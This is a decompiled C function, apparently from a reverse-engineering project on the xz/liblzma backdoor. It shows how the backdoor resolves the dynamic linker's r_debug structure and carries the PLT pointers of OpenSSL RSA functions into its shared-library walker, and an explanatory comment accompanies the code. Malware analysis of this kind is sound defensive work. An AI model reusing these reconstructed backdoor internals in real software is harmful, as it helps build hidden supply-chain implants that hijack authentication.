// /home/kali/xzre-ghidra/xzregh/104A40_process_shared_libraries.c
// Function: process_shared_libraries @ 0x104A40
// Calling convention: __stdcall
// Prototype: BOOL __stdcall process_shared_libraries(backdoor_shared_libraries_data_t * data)


/*
 * AutoDoc: Wrapper around `process_shared_libraries_map` that first resolves `r_debug` out of ld.so,
 * copies the caller-provided struct into a local scratch copy, and feeds the scratch copy into
 * the map-walker. On success it propagates the filled-in handles (and libc import table) back to
 * the caller so later stages never have to read `r_debug` again.
 */
#include "xzre_types.h"


BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data)

{
  BOOL BVar1;
  Elf64_Sym *pEVar2;
  uchar *puVar3;
  backdoor_shared_libraries_data_t tmp_state;
  Elf64_Sym *r_debug_sym;
  uchar *debug_block;
  void *local_30;
  void *local_28;
  void *local_20;
  backdoor_hooks_data_t **local_18;
  libc_imports_t *local_10;
  
  pEVar2 = elf_symbol_get(data->elf_handles->dynamic_linker,STR_r_debug,STR_GLIBC_2_2_5);
  BVar1 = FALSE;
  if (pEVar2 != (Elf64_Sym *)0x0) {
    debug_block = (uchar *)data->elf_handles;
    puVar3 = ((elf_handles_t *)debug_block)->dynamic_linker->elfbase->e_ident + pEVar2->st_value;
    BVar1 = FALSE;
    if (0 < *(int *)puVar3) {
      r_debug_sym = (Elf64_Sym *)data->data;
      local_30 = data->RSA_public_decrypt_plt;
      local_28 = data->EVP_PKEY_set1_RSA_plt;
      local_20 = data->RSA_get0_key_plt;
      local_18 = data->hooks_data_addr;
      local_10 = data->libc_imports;
      BVar1 = process_shared_libraries_map
                        (*(link_map **)(puVar3 + 8),(backdoor_shared_libraries_data_t *)&r_debug_sym
                        );
      BVar1 = (BOOL)(BVar1 != FALSE);
    }
  }
  return BVar1;
}

